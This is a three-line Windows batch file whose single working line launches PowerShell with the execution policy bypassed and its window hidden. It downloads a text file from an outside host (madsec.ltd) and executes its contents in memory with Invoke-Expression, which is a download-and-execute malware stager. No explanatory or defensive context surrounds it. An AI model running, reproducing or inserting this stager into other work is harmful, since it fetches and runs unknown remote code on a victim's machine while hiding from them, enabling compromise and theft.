@echo off
powershell.exe -ep bypass -w h IEX ([System.Text.Encoding]::ASCII.GetString((New-Object Net.Webclient).DownloadData('http://madsec.ltd/OneLine.txt')))
exit